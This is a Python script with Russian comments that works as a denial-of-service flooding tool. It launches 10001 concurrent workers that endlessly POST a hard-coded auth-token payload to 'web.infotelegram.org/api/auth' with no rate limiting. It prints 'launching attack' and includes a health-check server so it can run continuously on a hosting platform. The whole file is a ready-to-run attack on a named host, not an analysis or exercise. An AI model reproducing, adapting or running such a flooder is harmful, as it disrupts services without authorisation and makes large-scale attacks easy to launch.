import asyncio
import aiohttp
from aiohttp import web
import json
import sys

# Конфигурация
URL = "https://web.infotelegram.org/api/auth"
PAYLOAD_DATA = "tgWebAuthToken=K3lAmoEkgzGN9GxufePihbJHqpc2jY9U1leGcNQiJwOZELqyizWS-AR5LBo8du5A32f_UwtvZIyGxFwUfugFC67u3mVor3F6d1XewaEGN8_oj0HxfytRh7qrIw7j23eJz9bVVtDvNYQJ5DRlEWRdpSxW8uZuSnlECIMQr_EFwPc&tgWebAuthUserId=1337&tgWebAuthDcId=1"
HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}
CONCURRENT_REQUESTS = 10001   # сколько запросов одновременно (нагрузка ~50 rps и выше)
REQUEST_TIMEOUT = 1        # таймаут на запрос

total_sent = 0
total_failed = 0

async def send_request(session, payload_json):
    global total_sent, total_failed
    try:
        async with session.post(URL, json=payload_json, headers=HEADERS, timeout=REQUEST_TIMEOUT) as resp:
            total_sent += 1
            if total_sent % 100 == 0:
                print(f"Отправлено: {total_sent}, ошибок: {total_failed}")
            # можно проверить статус, но необязательно
            # resp.status
    except Exception as e:
        total_failed += 1
        if total_failed % 10 == 0:
            print(f"Ошибка (всего {total_failed}): {e}")

async def worker(worker_id, session, payload_json, queue):
    """Постоянно берёт задачи из очереди (бесконечно)"""
    while True:
        await queue.get()
        await send_request(session, payload_json)
        queue.task_done()

async def burst_loop():
    """Бесконечно наполняет очередь задачами"""
    payload_json = {"data": PAYLOAD_DATA}
    queue = asyncio.Queue(maxsize=CONCURRENT_REQUESTS * 2)

    async with aiohttp.ClientSession() as session:
        # Запускаем воркеров
        workers = []
        for i in range(CONCURRENT_REQUESTS):
            w = asyncio.create_task(worker(i, session, payload_json, queue))
            workers.append(w)

        # Бесконечно добавляем задачи в очередь
        while True:
            await queue.put(1)   # легковесная метка
            # Если хотим ограничить максимальную скорость, можно добавить sleep(0)
            # но без sleep получим максимальную нагрузку
            await asyncio.sleep(0)

# ---- Веб-сервер для health check (нужен Railway) ----
async def health_check(request):
    return web.Response(text=f"OK, sent={total_sent}, failed={total_failed}")

async def run_web_server():
    app = web.Application()
    app.router.add_get("/", health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", 8080)
    await site.start()
    print("Health check server running on port 8080")
    # держим сервер живым
    await asyncio.Event().wait()

async def main():
    print(f"Запуск атаки: {CONCURRENT_REQUESTS} параллельных запросов...")
    # Запускаем веб-сервер и основной цикл параллельно
    await asyncio.gather(
        run_web_server(),
        burst_loop()
    )

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\nИтог: отправлено {total_sent}, ошибок {total_failed}")
        sys.exit(0)
